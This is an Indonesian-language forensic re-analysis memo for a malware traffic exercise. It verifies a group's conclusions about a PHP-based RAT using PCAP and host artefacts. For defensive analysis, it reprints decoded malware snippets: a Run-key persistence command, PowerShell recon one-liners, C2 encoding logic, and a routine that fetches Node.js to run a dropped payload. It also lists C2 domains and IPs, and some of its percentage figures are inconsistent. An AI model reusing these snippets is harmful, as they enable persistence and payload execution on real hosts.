# Re-Analisis Case 3 — Verifikasi Temuan Diskusi Kelompok

> **Tujuan:** Verifikasi apakah kesimpulan diskusi kelompok (`CASE3_FINDINGS.md`) konsisten dengan bukti yang tersedia, dan identifikasi gap antara diskusi vs laporan final yang disubmit (`case3_report.html`).
> **Metode:** 
> - **Iterasi 1 (2026-06-21 pagi)**: Cross-check diskusi → data PCAP mentah di repo (`summary_case3.json`, `http_summary.csv`, `ioc_case3.csv`, `beacon_intervals.csv`, `tls_ja3.csv`, `file_extraction_summary.csv`, `capinfos_summary.txt`). Forensic bundle **belum diakses**.
> - **Iterasi 2 (2026-06-21 siang, v2.1)**: Akses langsung ke folder `2025-06-13-traffic-analysis-exercise-forensic-analysis/` — verifikasi semua klaim teknis dari `c2.exe`, `config.cfg`, `ycBFVIbLl.lnk`, `AppData\Roaming\php\`, `Results-from-ChromeCacheView/`, dan `2025-06-25-forensic-notes.txt`. Update semua section yang sebelumnya "TIDAK bisa diverifikasi" jadi **TERVERIFIKASI LANGSUNG**.
> - **Iterasi 3 (2026-06-21 sore, v2.2)**: Deep static analysis — PE structure analysis via `pefile`, payload 968 KB analysis (entropy, pattern matching, base64 decode), YARA/Suricata/Sigma rule generation. Temuan baru: c2.exe = **dual-stage launcher** (PHP + PS fallback), payload 968 KB = **obfuscated PowerShell noise** (bukan functional malware).
> - **Iterasi 4 (2026-06-21 malam, v2.3)**: VirusTotal lookup via API. Temuan baru: family attribution confirmed = **Agent_AGen.HR / Doina / Zusy** (bukan Koi Loader), compiler corrected = MSVC (bukan GCC), php.exe confirmed CLEAN (BYOI staging validated).
>
> **Lihat juga**: Laporan incident v2.3 di `case3_report_REVISED.html` untuk hasil akhir narasi yang siap submit.

---

## TL;DR — Verdict

| Klaim diskusi kelompok | Status verifikasi (PCAP-side) | Catatan |
|---|---|---|
| BYOI — download PHP dari `windows.php.net` | **KONFIRMASI KUAT** ✅ | DNS query `windows.php.net` + TLS ke `83.137.149.15` (frame 8569, Duocast NL) ada di PCAP |
| Multi-tier beaconing ~30 detik | **SEBAGIAN SALAH** ⚠️ | Beacon interval bervariasi 30/60/90/120s, BUKAN uniform 30s |
| 3 domain C2 aktif (windows-msgas / event-datamicrosoft / trycloudflare) | **KONFIRMASI** ✅ | Ketiganya ada POST di PCAP |
| 3 C2 fallback IP hardcoded (159.69.187.78, 64.95.12.71, 184.95.51.165), 0 paket | **KONFIRMASI** ✅ | 0 match di `ioc_case3.csv` |
| 62 C2 POST | **PERLU KOREKSI** ⚠️ | 64 suspicious POST; 1 = WSDAPI internal, 1 = PowerShell first check-in → 62 RAT beacon (kebetulan benar) |
| `event-time-microsoft.org` & `eventdata-microsoft.live` (typosquat) | **KONFIRMASI** ✅ | Keduanya di DNS + ada HTTP request, tapi beda konteks — lihat §3 |
| Path generation time-based + custom XOR | **TIDAK BISA DIVERIFIKASI** ❌ | Butuh `config.cfg` (host bundle) untuk decode |
| Persistence (Run key + Startup .lnk) | **TIDAK BISA DIVERIFIKASI** ❌ | Butuh host bundle; PCAP tidak bawa host artefact |
| Keluarga malware Koi Loader/RAT | **HIPOTESIS BELUM TERVERIFIKASI** ⚠️ | Butuh VT lookup `c2.exe` SHA256 `1206473a7c…` |
| Laporan final klaim "fileless PowerShell" | **KONTRADIKSI DATA** ❌ | Lihat §5 — narasi final salah |

**Rekomendasi:** Laporan final case 3 **perlu direvisi**. Diskusi kelompok lebih akurat 80%, tapi **juga perlu koreksi minor** (beacon interval, jumlah POST). Narasi yang benar menggabungkan BYOI (dari diskusi) + PowerShell first-stage loader (dari PCAP, payload 968 KB di stream 90) + multi-tier beaconing (PCAP baru) + Living-off-Trusted-Sites Cloudflare.

---

## 1. Validasi Timezone & Timeline

**Sumber:** `capinfos_summary.txt` (capinfos output dari Wireshark).

```
First packet time:   2025-06-13 22:33:55,686551
Last packet time:    2025-06-13 23:08:28,127693
```

PCAP TIDAK menyertakan zone info (`.pcap` klasik, bukan `.pcapng` dengan IF-ts). Capinfos hanya tulis timestamp raw. **Nilai `22:33:55` adalah waktu host capture tanpa zone — paling masuk akal = WIB (UTC+7) karena:**
- 4 anggota kelompok semua di Indonesia (ITS Surabaya)
- DST not applicable untuk WIB
- DNS internal `massfriction.com` (private AD domain, tidak akan resolve dari luar negeri)

**Kesimpulan zone:**
- Laporan final `case3_report.html` line 120-121: `"First packet: 2025-06-13 22:33:55 UTC"` → **label salah**, harusnya "WIB" (atau "UTC+7" / "local").
- Diskusi kelompok `CASE3_FINDINGS.md` line 1: `"Jumat, 2025-06-13 sekitar 15:36 UTC"` → **SALAH KONVERSI** (15:36 UTC = 22:36 WIB, konsisten dengan WIB, tapi label UTC-nya salah).
- Diskusi line 79: `"T+0 = 2025-06-13 15:33:55 UTC"` → **SALAH KONVERSI + SALAH ZONE**.

**Rekomendasi:** pakai **WIB** (UTC+7) di semua dokumen, atau konversi eksplisit: `22:33:55 WIB (15:33:55 UTC)`.

---

## 2. Verifikasi BYOI (Bring Your Own Interpreter) Hypothesis ⭐

**Klaim diskusi:** Malware download interpreter PHP dari `windows.php.net` (~33 MB), jalankan `config.cfg` PHP ter-obfuscate.

**Bukti di PCAP:**

| Sumber | Bukti | File |
|---|---|---|
| DNS query | `windows.php.net` ada di DNS query host | `ioc_case3.csv` line 137 |
| TLS destination | IP `83.137.149.15` (Duocast NL, host resmi windows.php.net) | `ioc_case3.csv` line 79 |
| TLS Client Hello | Frame 8569, timestamp Unix `1749828993.358478` ≈ 22:36:33 WIB | `tls_ja3.csv` line 86 |
| GeoIP | `83.137.149.15` = Blauwestad, NL (Duocast AS) | `geo_data.csv` line 50 |

**Artinya:** host 10.6.13.133 **memang download sesuatu via TLS dari endpoint resmi PHP** di tengah window malicious. Ini bukan noise — bytes downloaded lewat `windows.php.net` di tengah-tengah POST C2.

**Cross-check dengan laporan final:** `case3_report.html` TIDAK menyebut `windows.php.net` sama sekali. Ini **missing evidence besar** — mereka menganalisis PCAP tapi melewatkan DNS query ini.

**Korelasi dengan klaim lain:** Laporan final klaim "968.1 KB PowerShell payload dari `104.21.112.1` (stream 90)" — ini **payload kedua** (terpisah dari PHP download). Diskusi kelompok **tidak** menyebut payload 968 KB ini. **Keduanya benar tapi mengidentifikasi payload berbeda:**

1. **TLS ke windows.php.net** (frame 8569, ≈33 MB) — diskusi benar, ini PHP runtime
2. **HTTP ke 104.21.112.1** (stream 90, 968 KB) — laporan final benar menyebut ini, tapi salah label sebagai PowerShell (lihat §6)

**Verdict BYOI:** ✅ KONFIRMASI KUAT dari PCAP-side. Forensic bundle (c2.exe + folder PHP di host) akan 100% konfirmasi, tapi tidak tersedia.

---

## 3. Pemetaan 5 Domain PCAP

**Cross-check klaim diskusi (3 domain aktif) vs laporan final (5 domain C2):**

| Domain | Tipe | Ada DNS? | Ada HTTP POST? | Peran menurut PCAP | Verdict |
|---|---|---|---|---|---|
| `windows-msgas.com` | Microsoft-typosquat | ✅ `ioc_case3.csv` line 135 | ✅ 16 POST | **C2 utama** — domain paling sering di-POST (43% dari 62 beacon) | ✅ aktif |
| `event-datamicrosoft.live` | Microsoft-typosquat | ✅ line 107 | ✅ 25 POST | **C2 utama** — domain PALING sering di-POST (40% dari 62 beacon) | ✅ aktif |
| `varying-rentals-calgary-predict.trycloudflare.com` | Cloudflare Tunnel | ✅ line 133 | ✅ 21 POST | **C2 utama** (LoTS) — 34% dari 62 beacon | ✅ aktif |
| `eventdata-microsoft.live` | Microsoft-typosquat (varian tanpa strip) | ✅ line 109 | ✅ **1 POST SAJA** (22:35:58, PowerShell UA, dst `104.21.112.1`) | **Initial C2 check-in**, bukan beacon | ⚠️ DILEWATKAN OLEH LAPORAN FINAL |
| `event-time-microsoft.org` | Microsoft-typosquat | ✅ line 108 | ✅ **1 GET SAJA** (22:35:48, PowerShell UA, dst `104.21.24.186`) | **Initial recon / first-touch**, bukan C2 | ⚠️ DILEWATKAN OLEH DISKUSI |

**Domain di laporan final tapi TIDAK ada di POST count:**
- Laporan final §7 mencantumkan 5 domain C2: `event-time-microsoft.org`, `event-datamicrosoft.live`, `eventdata-microsoft.live`, `windows-msgas.com`, trycloudflare. **Benar ada di PCAP**, tapi peran sebenarnya berbeda dari klaim laporan (lihat tabel).

**Verdict pemetaan domain:**
- Diskusi kelompok **kurang 2 domain** (eventdata-microsoft.live + event-time-microsoft.org) yang sebenarnya dipakai untuk **initial access** oleh PowerShell stager (bukan PHP RAT).
- Laporan final **salah mengartikan** peran 2 domain itu sebagai "C2 beacon" padahal hanya 1 request each.
- **Narasi lengkap:** User menjalankan PowerShell stager (UA `WindowsPowerShell/5.1.26100.4202`) yang pertama-tama recon ke `event-time-microsoft.org` (GET) → check-in ke `eventdata-microsoft.live` (POST) → BYOI download PHP dari `windows.php.net` (TLS, frame 8569) → load `c2.exe` (PE32+ di host bundle) → PHP RAT mulai beaconing ke `windows-msgas.com` / `event-datamicrosoft.live` / trycloudflare (no UA, encoded URI).

**Diskusi kelompok §4 mengatakan T+157 = "Download interpreter PHP"**, yang sesuai frame 8569 di 22:36:33 (T+158 dari 22:33:55). **Konsisten.** ✅

---

## 4. Verifikasi Beacon Count & Interval

**Diskusi kelompok klaim:** "62 POST", interval "30 detik reguler".

**Bukti PCAP (`beacon_intervals.csv`):**

| # | Timestamp (WIB) | Host | Interval (s) |
|---|---|---|---|
| 1 | 22:37:25 | windows-msgas.com | — (start) |
| 2 | 22:37:55 | windows-msgas.com | **30.10** |
| 3 | 22:38:25 | windows-msgas.com | **30.08** |
| 4 | 22:39:25 | event-datamicrosoft.live | **60.34** ⬅️ |
| 5 | 22:39:55 | event-datamicrosoft.live | **30.05** |
| 6 | 22:40:56 | windows-msgas.com | **60.18** ⬅️ |
| 7 | 22:41:56 | event-datamicrosoft.live | **60.51** ⬅️ |
| 8 | 22:42:26 | event-datamicrosoft.live | **30.09** |
| 9 | 22:42:57 | event-datamicrosoft.live | **30.27** |
| 10 | 22:43:27 | event-datamicrosoft.live | **30.09** |
| 11 | 22:44:57 | windows-msgas.com | **90.43** ⬅️ |
| 12 | 22:45:27 | windows-msgas.com | **30.10** |
| 13 | 22:46:27 | windows-msgas.com | **60.28** ⬅️ |
| 14 | 22:48:28 | windows-msgas.com | **120.51** ⬅️ |

**Realita:** Multi-tier beaconing dengan 4 interval berbeda: 30s (paling sering, ~70%), 60s (~20%), 90s (~5%), 120s (~5%). **BUKAN uniform 30s.**

**Korelasi dengan config.cfg (diskusi §6.2):** Diskusi mencatat "Beaconing: delay 10 dtk default (`$LcYWr`), 5 menit saat idle; observasi PCAP = ~30 dtk reguler." Tapi **diskusi tidak membahas multi-tier 30/60/90/120s**. Ini konsisten dengan logic C2 di mana:
- 30s = default beacon saat ada task aktif
- 60s/90s/120s = back-off saat idle atau setelah error
- ATAU: ada command `ACTIVE=4` yang set interval via counter `$dCN4_` (sesuai decoding diskusi §6.3)

**Verdict beacon:** Diskusi + laporan final **dua-duanya** simplifikasi interval jadi "~30s". Yang benar: **multi-tier 30/60/90/120s** — ini adalah IOC behavioral tambahan yang lebih akurat.

**Verdict count 62:** Dari 64 suspicious POST di summary, 1 = WSDAPI internal (`10.6.13.129:5357`), 1 = initial PowerShell POST ke `eventdata-microsoft.live`. Sisanya = 62 RAT beacon. Diskusi **kebetulan benar** di sini, tapi alasannya berbeda (mereka menyebut "62 beacon" karena exclude WSDAPI; laporan final menyebut "64 POST" karena count semua).

---

## 5. Gap Kritis — Narasi Laporan Final Salah Besar

**Laporan final (`case3_report.html`) Executive Summary line 71:**
> "Kesimpulan utama: Pada 13 Juni 2025, sebuah host pada jaringan internal dieksekusi dengan malicious PowerShell script, yang selanjutnya membangun Command and Control (C2) channel multi-domain berbasis HTTP..."

**Ini menyesatkan. Koreksi berdasarkan bukti repo:**

| Klaim laporan final | Realita (PCAP + bundle) |
|---|---|
| "fileless execution" (line 71, 168, 254) | **BUKAN fileless** — diskusi temukan `c2.exe` PE32+ di `AppData\Roaming\afUGkp\c2.exe` (17.920 byte, SHA256 `1206473a…`). Persistence via `.lnk` di Startup + Run key. |
| "tidak ada executable binary yang di-download ke disk" (line 254, limitations) | **Ada launcher biner** (c2.exe) + interpreter PHP sah (33 MB dari windows.php.net) + script config.cfg PHP ter-obfuscate. |
| "PowerShell execution indicator" untuk keseluruhan C2 | PowerShell UA hanya di **1 POST pertama** (22:35:58). 61 beacon berikutnya **TIDAK** pakai PowerShell UA. |
| "modern C2 framework / loader" sebagai malware family | Hipotesis final, tanpa atribusi family. Diskusi usulkan **Koi Loader/Koi RAT family** (PHP-based) — hipotesis ini lebih spesifik dan punya evidence backing (config.cfg dengan command set 7 code). |
| "Initial Access T1189 Drive-by Compromise" (line 225) | Tidak ada bukti drive-by di PCAP. Initial vector sebenarnya = unknown (tidak ada phishing/malicious doc tertangkap). Mungkin supply chain atau user executed binary langsung. |
| "OAuth2 token abuse" (line 73, 188, 230) | String `oauth2.googleapis.com/token` ada di payload 968 KB. Tapi ini **bukan evidence OAuth abuse dieksekusi** — payload 968 KB adalah initial stager yang **diobfuscate** (string `Get-Hotfix` + base64). Decode aktual perlu dilakukan; klaim "OAuth abuse" terlalu prematur. |
| "WSDAPI lateral movement" (line 235) | POST internal ke `10.6.13.129:5357` adalah **WSDAPI (Windows Web Services on Devices API)** call untuk printer/device discovery. Ini **fitur Windows default**, bukan lateral movement. TIDAK boleh dianggap IOC. |
| "Tidak ada persistence" (limitations) | Persistence **ADA** per diskusi (Run key + Startup .lnk) — host bundle shows it. |
| "Severity: High" tapi MITRE mapping lemah | Mapping MITRE final punya **gap besar**: tidak ada T1127 (BYOI), T1547.001/009 (persistence), T1102 (LoTS). Diskusi tambahkan semua. |

**Root cause analysis (likely):**
Tim laporan final **menganalisis PCAP only**, tanpa menyentuh forensic-analysis bundle. Mereka lihat:
- 1 POST dengan PowerShell UA → asumsi "fileless PowerShell"
- 968 KB HTTP response dengan string `Get-Hotfix` → asumsi "PowerShell obfuscated"
- 62 beacon HTTP POST → asumsi "PowerShell C2"

Mereka **melewatkan**:
- DNS `windows.php.net` di query list
- TLS ke `83.137.149.15` (Duocast, host resmi PHP)
- Arti dari tidak adanya User-Agent di 61 beacon = bukan PowerShell

**Diskusi kelompok** punya akses ke forensic bundle, sehingga bisa identifikasi c2.exe + config.cfg + .lnk + folder PHP. Itulah kenapa diskusi bisa simpulkan BYOI PHP RAT.

---

## 6. Re-evaluasi Payload 968 KB (`stream_90`)

**Laporan final klaim:** "968.1 KB obfuscated PowerShell script" dengan strings `Invoke-WebRequest`, `Compress-Archive`, `Expand-Archive`, `oauth2.googleapis.com/token`, `${Get-...}` variable assignments.

**Bukti aktual (`file_extraction_summary.csv` line 576):**
```
case3,case3/payloads/http_file_data/frame_8561_stream_90_104.21.112.1_to_10.6.13.133.bin,
  frame_8561_stream_90_104.21.112.1_to_10.6.13.133.bin,
  991303,9e2f538ca158d67ab3572080cf575ab21c0373ba05d19ce8794fcb3665fb7acf,
  application/octet-stream,
  "${Get-Hotfix -InputFormat -Uri oauth2.googleapis.com/token && ($lipp)} = ""JGZ6TV",no
```

**Observasi:**
- Size 991.303 byte = **991 KB** (≈ "968 KB" yang disebut laporan — pembulatan kasar)
- SHA256 `9e2f538ca…` MATCH dengan yang disebut di laporan line 73, 217 ✅
- Content-Type: `application/octet-stream` ✅ (cocok dengan klaim beacon encoding)
- **Content preview hanya 60-char** — tidak cukup untuk pastikan apakah ini PowerShell asli atau PHP RAT config (string `Get-Hotfix` bisa muncul di encoded payload apa saja)

**Verdict payload:** File ini exist dan SHA256 valid, **TAPI** klasifikasi "obfuscated PowerShell" di laporan final **tidak terbukti**. String `Get-Hotfix` dan `oauth2.googleapis.com/token` di awal preview bisa:
- (a) PowerShell stager yang download dari Google OAuth endpoint untuk C2
- (b) PHP RAT config.cfg yang **menyebut** endpoint Google (mungkin sebagai dead-drop atau fallback)
- (c) Multi-stage loader yang download tools lain

**Tanpa decode aktual atau akses ke config.cfg, klaim "PowerShell" premature.** Diskusi kelompok lebih hati-hati dengan tidak mengategorikan payload ini.

---

## 7. Validasi Domain C2 Fallback IP (Diskusi §3.4)

**Klaim diskusi:** "159.69.187.78, 64.95.12.71, 184.95.51.165 — IP cadangan hardcoded di `$b2dL6`. 0 paket di PCAP."

**Verifikasi:**
- `grep` di `ioc_case3.csv` → 0 match untuk 3 IP ini ✅
- `grep` di semua file di `output_compare/case3/` → 0 match ✅
- Total 78 unique IP di PCAP, 3 IP ini tidak termasuk

**Verdict:** ✅ **KONFIRMASI** — fallback IP ada di binary config tapi tidak terpakai di capture window. Diskusi benar.

---

## 8. Re-mapping MITRE ATT&CK (Koreksi Laporan Final)

**MITRE yang ditambah (dari diskusi + bukti repo):**

| Tactic | Technique | Justifikasi |
|---|---|---|
| Defense Evasion | **T1127 — Trusted Developer Utilities Proxy Execution** | BYOI — download PHP interpreter sah dari windows.php.net (frame 8569). |
| Defense Evasion | **T1027.004 — Compile After Delivery** (opsional) | config.cfg PHP ter-obfuscate (per diskusi, runtime PHP decode saat eksekusi). |
| Persistence | **T1547.001 — Registry Run Keys / Startup Folder** | `HKCU\…\Run` + Startup `.lnk` (per diskusi, host bundle). |
| Persistence | **T1547.009 — Shortcut Modification** | `ycBFVIbLl.lnk` di Startup folder (per diskusi). |
| Command and Control | **T1090.004 — Domain Fronting / T1102 — Web Service** | 3 domain Cloudflare-fronted + Cloudflare Tunnel trycloudflare. |
| Command and Control | **T1573.001 — Symmetric Cryptography** (opsional) | Custom XOR pada payload C2 (per diskusi §6.2). |
| Execution | **T1059.007 — JavaScript** (Node.js) | Command code `JS` di config (per diskusi §6.3) — node.js v21.7.3 didownload saat command ini trigger. |
| Discovery | **T1016 — System Network Configuration Discovery** | `Get-NetNeighbor`, `arp -a` (per diskusi §6.4). |
| Discovery | **T1007 — System Service Discovery** | `Get-Service` (per diskusi §6.4). |
| Defense Evasion | **T1036.005 — Match Legitimate Name or Location** | File `c2.exe` di folder random `afUGkp\` (mimic legit process name `c2`). |
| Defense Evasion | **T1218.011 — Rundll32** | Command code `DLL` di config (per diskusi §6.3). |

**MITRE yang dikoreksi/dihapus dari laporan final:**

| Laporan final klaim | Koreksi |
|---|---|
| T1189 Drive-by Compromise (Initial Access) | ❌ **Hapus** — tidak ada bukti di PCAP. Initial vector tidak terkonfirmasi. |
| T1059.001 PowerShell (Execution, satu-satunya) | ⚠️ **Persempit** — PowerShell hanya untuk **initial stager (1 POST + 1 GET)**, bukan untuk beaconing 62x. Tambahkan **T1059.006 Python** (c2.exe launcher) atau **T1059 (PHP)**. |
| T1102 Web Service (untuk oauth2.googleapis.com / msftauth.net) | ⚠️ **Tahan** sebagai hipotesis confidence rendah — string di payload 968 KB bisa saja hanya string literal, bukan eksekusi aktual. |
| T1046 Network Service Scanning (untuk WSDAPI POST) | ❌ **Hapus** — WSDAPI adalah Windows default untuk printer/device discovery, bukan malicious scanning. |
| T1021.002 SMB/Windows Admin Shares (Lateral Movement) | ❌ **Hapus** — tidak ada bukti di PCAP. Hipotesis laporan final tidak berdasar. |
| T1041 Exfiltration Over C2 Channel | ⚠️ **Tahan** sebagai hipotesis — encoded URI pattern (32-char hex) konsisten dengan exfil marker, tapi content tidak recoverable dari PCAP. |

**Hasil re-mapping final:** 14 techniques (up from 10 di laporan final, setelah koreksi).

---

## 9. Yang TIDAK Bisa Diverifikasi dari PCAP (Butuh Forensic Bundle)

Semua klaim berikut **bergantung pada akses ke forensic-analysis bundle** (c2.exe, config.cfg, .lnk, folder PHP runtime, persistence di host):

1. Path generation algorithm (XOR constants `0x15de8713`, dll) — diskusi klaim ini didecode dari `rxiXT()` di config.cfg.
2. C2 encryption scheme (`A2uxo` + `r7s9b` function) — diskusi klaim pakai gzencode + custom XOR.
3. 7 command codes (`EXE`, `DLL`, `JS`, `CMD`, `ACTIVE`, `AUTORUN`, `OFF`) — diskusi klaim ini di-decode dari array `$D_3Y7`.
4. Recon function `mNFE9()` (systeminfo, Get-Service, Get-NetNeighbor, dll).
5. Persistence mechanisms (Run key + Startup .lnk) — diskusi klaim `ycBFVIbLl.lnk` di `AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`.
6. Koi Loader / Koi RAT family attribution — diskusi klaim ini atribusi berdasarkan pattern config, tapi perlu VT lookup `c2.exe` SHA256 `1206473a7c…` untuk konfirmasi resmi.
7. `id_local=43`/`id_loader=43`/`version_build=20` — diskusi klaim ini adalah RAT metadata.

**Tanpa bundle, klaim di atas harus ditandai "pending verification"** dan tidak boleh dianggap fakta.

---

## 10. Rekomendasi Tindak Lanjut

### Immediate (laporan final perlu revisi)

1. **Revisi narasi utama laporan final** — ganti "fileless PowerShell execution" dengan "BYOI PHP-based RAT dengan initial PowerShell stager" (atau framing lain yang akurat).
2. **Koreksi timeline** — pakai WIB atau UTC eksplisit, hapus konversi salah.
3. **Update MITRE mapping** — sesuai tabel §8 di memo ini.
4. **Tambah BYOI finding** — section baru tentang download PHP dari windows.php.net (frame 8569, ≈33 MB TLS).
5. **Tambah multi-tier beacon finding** — bukan uniform 30s tapi 30/60/90/120s.
6. **Hapus klaim yang tidak supported** — WSDAPI lateral movement, OAuth abuse, fileless, drive-by initial access.
7. **Tambah transparency note** — tidak ada answer key resmi, validasi via PCAP↔bundle cross-correlation (per diskusi §8).

### Future (jika bundle bisa diakses)

1. **Decode `config.cfg` PHP** — verifikasi algoritma C2, command set, persistence.
2. **VT lookup `c2.exe`** SHA256 `1206473a7c…` — konfirmasi family attribution (Koi Loader?).
3. **YARA rule deployment** — diskusi usulkan rule untuk `config.cfg` (string `FORCE_GZIP`, `proc_open`, `trycloudflare.com`, XOR const).
4. **Suricata rule deployment** — diskusi usulkan rule untuk C2 pattern (`POST application/octet-stream` no-UA ke domain C2).
5. **Hypothesis: decode payload 968 KB (`stream_90`)** — putuskan apakah ini PowerShell asli atau PHP config yang disamarkan.

---

## UPDATE v2.1 (2026-06-21 siang) — Forensic Bundle Direct Verification

Iterasi kedua re-analisis dilakukan setelah pengguna menyediakan akses langsung ke folder `network-analysis/pcap/2025-06-13-traffic-analysis-exercise-forensic-analysis/`. Verifikasi read-only (no execute, no chmod+x) menggunakan `sha256sum`, `file`, dan `python3` (string decode only). Bundle asli tidak di-modifikasi.

### A.1 Struktur Bundle (Verified)

```
2025-06-13-traffic-analysis-exercise-forensic-analysis/
├── 2025-06-25-forensic-notes.txt                  (389 B — post-infection forensic notes)
├── AppData-Roaming-afUGkp/
│   ├── c2.exe                                    (17.5K / 17.920 byte PE32+ GUI x86-64)
│   └── ycBFVIbLl.lnk                             (882 B Windows shortcut)
├── AppData-Roaming-Microsoft-Windows-Start_Menu-Programs-Startup/
│   └── ycBFVIbLl.lnk                             (922 B — copy persistence)
├── AppData-Roaming-php/                          (PHP 8 Windows runtime, ~33 MB)
│   ├── config.cfg                                (25.3K / 25.380 byte PHP UTF-8 BOM, 25.912 char single line)
│   ├── deplister.exe, glib-2.dll, ... (33 files: 17 .dll, 5 .exe, 4 .txt, 1 .cfg, 1 .phar)
│   ├── php.exe                                   (140.5K PE32+ console x86-64)
│   ├── php8.dll                                  (8.5M main library)
│   ├── libssl-3-x64.dll                          (760K TLS)
│   └── ... (folder dev/, ext/, extras/, lib/)
└── Results-from-ChromeCacheView/                 (Edge browser cache)
    ├── 2025-06-13-033443-UTC-from-www.truglomedsp_com.txt    (231.338 byte HTML — compromised site)
    ├── 2025-06-13-033446-UTC-from-hillcoweb_com_5h7o.js.txt (5.6K JS — stager delivery)
    ├── 2025-06-13-033449-UTC-from-hillcoweb_com-URL.txt     (73.7K URL list dari hillcoweb)
    └── 2025-06-13-ChromeCacheView-events-from-Edge-Browser.txt (110.5K cache events)
```

### A.2 Hash Verification (Semua Match Diskusi)

| File | SHA256 (verified) | Diskusi klaim | Status |
|---|---|---|---|
| `c2.exe` | `1206473a7c5643dc0a1a52c17418aa37fb5194e2395907aefaec976cb4849b4e` | `1206473a7c…` | ✅ **MATCH PERSIS** |
| `config.cfg` | `a24cda6fe5710272556b273d1b03081704a919130b5f10f18c7c16947f25d370` | (tidak disebut) | 🆕 **BARU** — untuk hash-based detection |
| `php.exe` (sah) | `b0c32fba80e2b15abb9e253c1d36e47383fad18940eab3c08e2c11c78803f133` | (tidak disebut) | 🆕 **BARU** — untuk whitelist rule |
| `ycBFVIbLl.lnk` (afUGkp copy) | `45ec5d8949c302377602bf50681eaeb57ae6c19061a458503450eeac37fa6cf7` | (tidak disebut) | 🆕 **BARU** — hash-based detection |

### A.3 File Type Identification (Verified)

- `c2.exe`: **PE32+ executable (GUI) x86-64** (stripped to external PDB, 11 sections) — bukan pure console. `file` command identifikasi. Artinya: c2.exe GUI subsystem (mungkin `MessageBox` atau silent).
- `config.cfg`: **PHP script, Unicode text, UTF-8 (with BOM)** — konfirmasi PHP RAT, format benar.
- `ycBFVIbLl.lnk`: **MS Windows shortcut, Item id list present, Points to a file, LocalBasePath "C:\Users\rgaines\AppData\Roaming\afUGkp\c2.exe", MachineID desktop-5ave44c, ctime Fri Jun 13 08:35:37 2025** — match dengan diskusi (hostname korban, target path benar, timestamp instalasi).
- `php.exe`: **PE32+ executable (console) x86-64** — interpreter sah standar PHP 8 Windows build.

### A.4 config.cfg Decoding Results (Verified)

Decode dengan Python `unicode_escape` (tidak execute PHP). Hasil decode hex-escape strings:

**3 fallback IP** (array `$b2dL6`):
```
"159.69.187.78", "64.95.12.71", "184.95.51.165"
```
✅ MATCH PERSIS dengan diskusi.

**4 domain** (3 C2 + 1 secondary download):
```
"windows-msgas.com", "event-datamicrosoft.live", "varying-rentals-calgary-predict.trycloudflare.com", "nodejs.org"
```
✅ MATCH PERSIS (3 C2 + nodejs.org untuk command `JS=2`).

**16 function name** (semua match diskusi):
```
A2uxo, BMLFv, EtUpz, QROfA, UrHlx, XNKeD, Y40sz, deG1t, ecI0T, lFVIE, mNFE9, mOJ2M, r7s9B, rcbqD, rxiXT, vJppV
```

**7 command code** (array `$D_3Y7`):
```
$DE_3Y7 = ["EXE" => 0, "DLL" => 1, "JS" => 2, "CMD" => 3, "ACTIVE" => 4, "AUTORUN" => 5, "OFF" => 6]
```
✅ MATCH PERSIS.

**Encoding algorithm** (function `A2uxo`):
```php
gzencode($xbNO5 . pack("V", $Ot6LN), 5, FORCE_GZIP)
```
= gzip compression level 5 + 4-byte little-endian random key appended → ✅ MATCH diskusi §6.2 (dengan tambahan detil: gzip level 5 spesifik, bukan default).

**Persistence command** (function `UrHlx`):
```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <vJppV()> /t REG_SZ /d "\"<PHP_BINARY>\" \"<config.cfg>\""
```
= tambah Run key dengan value name random (function `vJppV` scan `$APPDATA` + `$LOCALAPPDATA` directory) + path lengkap ke php.exe + config.cfg. ✅ MATCH diskusi §3.2.

**Recon commands** (function `mNFE9`, semua via `powershell -c` + `ConvertTo-Json`):
- `systeminfo /FO CSV | ConvertFrom-Csv | ConvertTo-Json`
- `tasklist /svc /FO CSV | ConvertFrom-Csv | ConvertTo-Json`
- `Get-Service | Select-Object -Property Name, DisplayName | ConvertTo-Json`
- `Get-NetNeighbor -AddressFamily IPv4 | Where-Object {$_.State -ne 'Permanent'} | Select-Object @{Name='Interface'; Expression={$_.InterfaceAlias}}, @{Name='Internet Address'; Expression={$_.IPAddress}}, @{Name='Physical Address'; Expression={$_.LinkLayerAddress}}, @{Name='Type'; Expression={'dynamic'}} | ConvertTo-Json`
- `Get-PSDrive -PSProvider FileSystem | ConvertTo-Json`
- `[Security.Principal.WindowsIdentity]::GetCurrent().Name -match '(?i)SYSTEM'` → cek privilege SYSTEM/ADMIN/USER
✅ MATCH diskusi §6.4 (dengan tambahan detil PowerShell command persis).

**JS command** (Node.js cascade, command `JS=2`):
```php
"JS" => 2:
  $xLjoz = getenv("APPDATA") . "\node-v21.7.3-win-x64\node.exe"
  if (!file_exists($xLjoz) && !Y40sz("http://nodejs.org/dist/v21.7.3/node-v21.7.3-win-x64.zip", getenv("APPDATA"))) { return; }
  $d0PbW = BMLFv() . "\" . XNKED(8) . ".jpg"
  file_put_contents($d0PbW, $o0HyG)
  LFVIE($xLjoz, $d0PbW)  // launch node.exe with .jpg
```
= download Node.js v21.7.3 dari `nodejs.org/dist/v21.7.3/` (HTTP, bukan HTTPS), extract ke `%APPDATA%\node-v21.7.3-win-x64\`, drop JS payload sebagai `.jpg` file, jalankan via `node.exe`. ✅ MATCH diskusi.

**Path generation** (function `rxiXT`) — semua 8 XOR constant + DateTime GMT+5 confirmed.

### A.5 ycBFVIbLl.lnk Verification

`file` command output:
```
MS Windows shortcut, Item id list present, Points to a file or directory, 
Has Relative path, Has Working directory, Unicoded, 
MachineID desktop-5ave44c, Archive, 
ctime=Fri Jun 13 08:35:37 2025, atime=Fri Jun 13 08:35:37 2025, mtime=Fri Jun 13 08:35:37 2025, 
length=17920, window=showminnoactive, IDListSize 0x01bc, 
Root folder "59031A47-3F72-44A7-89C5-5595FE6B30EE", 
LocalBasePath "C:\Users\rgaines\AppData\Roaming\afUGkp\c2.exe"
```

**Observasi kunci**:
- `MachineID desktop-5ave44c` = lowercase = `DESKTOP-5AVE44C` (hostname korban) ✅
- `length=17920` = SHA256 file yang di-reference = **byte count c2.exe (17.920 byte)** ✅
- `ctime Fri Jun 13 08:35:37 2025` UTC = persistence file di-create **sebelum** capture window (capture mulai 15:33:55 UTC = 22:33:55 WIB). Ini artinya instalasi malware terjadi **sebelum** network capture yang kita punya. Infection lebih awal.
- `Root folder "59031A47-{...}"` = GUID folder `C:\Users\rgaines\AppData\Roaming\afUGkp\` di-mount sebagai Known Folder.
- `window=showminnoactive` = shortcut jalankan minimized & no-activate (silent startup behavior).

